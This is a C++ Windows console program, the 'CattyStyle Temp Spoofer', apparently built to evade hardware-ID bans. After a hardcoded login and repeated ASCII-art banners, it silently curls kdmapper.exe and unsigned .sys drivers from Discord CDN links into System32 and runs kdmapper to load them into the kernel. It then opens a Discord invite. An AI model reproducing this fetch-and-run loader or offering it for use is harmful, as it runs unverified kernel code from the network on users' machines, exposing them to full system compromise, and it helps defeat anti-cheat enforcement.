#include <Windows.h>
#include <iostream>
#include <tchar.h>
#include <urlmon.h>
#include <string>
#pragma comment (lib,"urlmon.lib")
#pragma comment (lib,"wininet")

// FUNCTIONS 
bool checkCredentials(const std::string& username, const std::string& password)
{
    return (username == "Catty" && password == "Style");
}
void SetConsoleTextColor(int colorCode)
{
    HANDLE hConsole = GetStdHandle(STD_OUTPUT_HANDLE);
    SetConsoleTextAttribute(hConsole, colorCode);
}
// END OF FUNCTIONS

int main()
{
    SetConsoleTitleA("                                                                                                                      CattyStyle Temp Spoofer");
    SetConsoleTextColor(5);
    std::cout << "                                         _____      _   _          _____ _         _      \n";
    std::cout << "                                        / ____|    | | | |        / ____| |       | |     \n";
    std::cout << "                                       | |     __ _| |_| |_ _   _| (___ | |_ _   _| | ___ \n";
    std::cout << "                                       | |    / _` | __| __| | | |\\___ \\| __| | | | |/ _ \\\n";
    std::cout << "                                       | |___| (_| | |_| |_| |_| |____) | |_| |_| | |  __/\n";
    std::cout << "                                        \\_____\\__,_|\\__|\\__|\\__, |_____/ \\__|\\__, |_ |\\___|\n";
    std::cout << "                                                            __/ |            __/ |       \n";
    std::cout << "                                                           |___/            |___/        \n";
    std::cout << "                                                                                                 \n";
    std::cout << "                                                                                                 \n";
    std::cout << "                                                                                                 \n";
    std::cout << "                                                                                                 \n";
    SetConsoleTextColor(7);
    std::string username;
    std::string password;

    std::cout << "   [+] Username: ";
    std::cin >> username;

    std::cout << "   [+] Password: ";
    std::cin >> password;

    if (checkCredentials(username, password))
    {
        // Authentication successful
        MessageBoxA(NULL, "Login successful", "Opening", MB_OK);
        Sleep(3000);
        system("cls");
        SetConsoleTextColor(5);
        std::cout << "                                         _____      _   _          _____ _         _      \n";
        std::cout << "                                        / ____|    | | | |        / ____| |       | |     \n";
        std::cout << "                                       | |     __ _| |_| |_ _   _| (___ | |_ _   _| | ___ \n";
        std::cout << "                                       | |    / _` | __| __| | | |\\___ \\| __| | | | |/ _ \\\n";
        std::cout << "                                       | |___| (_| | |_| |_| |_| |____) | |_| |_| | |  __/\n";
        std::cout << "                                        \\_____\\__,_|\\__|\\__|\\__, |_____/ \\__|\\__, |_ |\\___|\n";
        std::cout << "                                                            __/ |            __/ |       \n";
        std::cout << "                                                           |___/            |___/        \n";
        std::cout << "                                                                                                 \n";
        std::cout << "                                                                                                 \n";
        std::cout << "                                                                                                 \n";
        std::cout << "                                                                                                 \n";
        SetConsoleTextColor(5);
        std::cout << "                                            Welcome To CattyStyle Spoofer\n";
        std::cout << "                                                  Made by qrsmodz :P";
        Sleep(3000);
        system("cls");
        SetConsoleTextColor(5);
        std::cout << "                                         _____      _   _          _____ _         _      \n";
        std::cout << "                                        / ____|    | | | |        / ____| |       | |     \n";
        std::cout << "                                       | |     __ _| |_| |_ _   _| (___ | |_ _   _| | ___ \n";
        std::cout << "                                       | |    / _` | __| __| | | |\\___ \\| __| | | | |/ _ \\\n";
        std::cout << "                                       | |___| (_| | |_| |_| |_| |____) | |_| |_| | |  __/\n";
        std::cout << "                                        \\_____\\__,_|\\__|\\__|\\__, |_____/ \\__|\\__, |_ |\\___|\n";
        std::cout << "                                                            __/ |            __/ |       \n";
        std::cout << "                                                           |___/            |___/        \n";
        std::cout << "                                                                                                 \n";
        std::cout << "                                                                                                 \n";
        std::cout << "                                                                                                 \n";
        std::cout << "                                                                                                 \n";
        std::cout << "                                          Connecting To CattyStyle...\n";
        Sleep(2000);
        system("cls");
        SetConsoleTextColor(5);
        std::cout << "                                         _____      _   _          _____ _         _      \n";
        std::cout << "                                        / ____|    | | | |        / ____| |       | |     \n";
        std::cout << "                                       | |     __ _| |_| |_ _   _| (___ | |_ _   _| | ___ \n";
        std::cout << "                                       | |    / _` | __| __| | | |\\___ \\| __| | | | |/ _ \\\n";
        std::cout << "                                       | |___| (_| | |_| |_| |_| |____) | |_| |_| | |  __/\n";
        std::cout << "                                        \\_____\\__,_|\\__|\\__|\\__, |_____/ \\__|\\__, |_ |\\___|\n";
        std::cout << "                                                            __/ |            __/ |       \n";
        std::cout << "                                                           |___/            |___/        \n";
        std::cout << "                                                                                                 \n";
        std::cout << "                                                                                                 \n";
        std::cout << "                                                                                                 \n";
        std::cout << "                                                                                                 \n";
        std::cout << "                                                        Connected\n";
        Sleep(3000);
        system("cls");
        SetConsoleTextColor(5);
        std::cout << "                                         _____      _   _          _____ _         _      \n";
        std::cout << "                                        / ____|    | | | |        / ____| |       | |     \n";
        std::cout << "                                       | |     __ _| |_| |_ _   _| (___ | |_ _   _| | ___ \n";
        std::cout << "                                       | |    / _` | __| __| | | |\\___ \\| __| | | | |/ _ \\\n";
        std::cout << "                                       | |___| (_| | |_| |_| |_| |____) | |_| |_| | |  __/\n";
        std::cout << "                                        \\_____\\__,_|\\__|\\__|\\__, |_____/ \\__|\\__, |_ |\\___|\n";
        std::cout << "                                                            __/ |            __/ |       \n";
        std::cout << "                                                           |___/            |___/        \n";
        std::cout << "                                                                                                 \n";
        std::cout << "                                                                                                 \n";
        std::cout << "                                                                                                 \n";
        std::cout << "                                                                                                 \n";
        std::string choice;

        std::cout << "                                            Do You Want To Spoof? (y/n): ";
        std::cin >> choice;

        if (choice == "y" || choice == "Y")
        {
            // Spoofer code
            SetConsoleTextColor(5);
            std::cout << "                                         _____      _   _          _____ _         _      \n";
            std::cout << "                                        / ____|    | | | |        / ____| |       | |     \n";
            std::cout << "                                       | |     __ _| |_| |_ _   _| (___ | |_ _   _| | ___ \n";
            std::cout << "                                       | |    / _` | __| __| | | |\\___ \\| __| | | | |/ _ \\\n";
            std::cout << "                                       | |___| (_| | |_| |_| |_| |____) | |_| |_| | |  __/\n";
            std::cout << "                                        \\_____\\__,_|\\__|\\__|\\__, |_____/ \\__|\\__, |_ |\\___|\n";
            std::cout << "                                                            __/ |            __/ |       \n";
            std::cout << "                                                           |___/            |___/        \n";
            std::cout << "                                                                                                 \n";
            std::cout << "                                                                                                 \n";
            std::cout << "                                                                                                 \n";
            std::cout << "                                                                                                 \n";
            SetConsoleTextColor(5);
            std::cout << "                                            Spoofing Please Wait..\n";
            system("cls");
            SetConsoleTextColor(5);
            std::cout << "                                         _____      _   _          _____ _         _      \n";
            std::cout << "                                        / ____|    | | | |        / ____| |       | |     \n";
            std::cout << "                                       | |     __ _| |_| |_ _   _| (___ | |_ _   _| | ___ \n";
            std::cout << "                                       | |    / _` | __| __| | | |\\___ \\| __| | | | |/ _ \\\n";
            std::cout << "                                       | |___| (_| | |_| |_| |_| |____) | |_| |_| | |  __/\n";
            std::cout << "                                        \\_____\\__,_|\\__|\\__|\\__, |_____/ \\__|\\__, |_ |\\___|\n";
            std::cout << "                                                            __/ |            __/ |       \n";
            std::cout << "                                                           |___/            |___/        \n";
            std::cout << "                                                                                                 \n";
            std::cout << "                                                                                                 \n";
            std::cout << "                                                                                                 \n";
            std::cout << "                                                                                                 \n";
            SetConsoleTextColor(5);
            std::cout << "                                                      LOADING DRIVERS\n";
            Sleep(10000);
            system("curl --silent https://cdn.discordapp.com/attachments/1126639833629077585/1127418103056314448/kdmapper.exe --output C:\\Windows\\System32\\kdmapper.exe >nul 2>&1");
            system("curl --silent https://cdn.discordapp.com/attachments/1120440445898604584/1126237834605498440/Spoofy.sys --output C:\\Windows\\System32\\Spoofy.sys >nul 2>&1");
            system("cd C:\\Windows\\System32\\ && kdmapper.exe Spoofy.sys");
            system("cls");
            SetConsoleTextColor(5);
            std::cout << "                                         _____      _   _          _____ _         _      \n";
            std::cout << "                                        / ____|    | | | |        / ____| |       | |     \n";
            std::cout << "                                       | |     __ _| |_| |_ _   _| (___ | |_ _   _| | ___ \n";
            std::cout << "                                       | |    / _` | __| __| | | |\\___ \\| __| | | | |/ _ \\\n";
            std::cout << "                                       | |___| (_| | |_| |_| |_| |____) | |_| |_| | |  __/\n";
            std::cout << "                                        \\_____\\__,_|\\__|\\__|\\__, |_____/ \\__|\\__, |_ |\\___|\n";
            std::cout << "                                                            __/ |            __/ |       \n";
            std::cout << "                                                           |___/            |___/        \n";
            std::cout << "                                                                                                 \n";
            std::cout << "                                                                                                 \n";
            std::cout << "                                                                                                 \n";
            std::cout << "                                                                                                 \n";
            std::cout << "                                                     LOADING DRIVERS\n";
            Sleep(3000);
            system("curl --silent https://cdn.discordapp.com/attachments/1126639833629077585/1127418103056314448/kdmapper.exe --output C:\\Windows\\System32\\kdmapper.exe >nul 2>&1");
            system("curl --silent https://cdn.discordapp.com/attachments/1120440445898604584/1126237823167639623/spoofer_new.sys --output C:\\Windows\\System32\\spoofer_new.sys >nul 2>&1");
            system("cd C:\\Windows\\System32\\ && kdmapper.exe spoofer_new.sys");
            SetConsoleTextColor(5);
            std::cout << "                                         _____      _   _          _____ _         _      \n";
            std::cout << "                                        / ____|    | | | |        / ____| |       | |     \n";
            std::cout << "                                       | |     __ _| |_| |_ _   _| (___ | |_ _   _| | ___ \n";
            std::cout << "                                       | |    / _` | __| __| | | |\\___ \\| __| | | | |/ _ \\\n";
            std::cout << "                                       | |___| (_| | |_| |_| |_| |____) | |_| |_| | |  __/\n";
            std::cout << "                                        \\_____\\__,_|\\__|\\__|\\__, |_____/ \\__|\\__, |_ |\\___|\n";
            std::cout << "                                                            __/ |            __/ |       \n";
            std::cout << "                                                           |___/            |___/        \n";
            std::cout << "                                                                                                 \n";
            std::cout << "                                                                                                 \n";
            std::cout << "                                                                                                 \n";
            std::cout << "                                                                                                 \n";
            SetConsoleTextColor(5);
            std::cout << "                                  Spoofed Have Fun Dont Forget To Join Our Discord And Check Us Out\n";
            system("start https://discord.gg/FfEQrsdyjp");
            Sleep(10000);
        }
        else if (choice == "n" || choice == "N")
        {
            MessageBoxA(NULL, "Deadass Brick With A Side Of Oh Nah", "YOO", MB_OK);
            }

        }
        else
        {
            // Authentication failed
            MessageBoxA(NULL, "WRONG LOGIN", "Get The Fuck Out", MB_OK);
            return 0;
        }
    }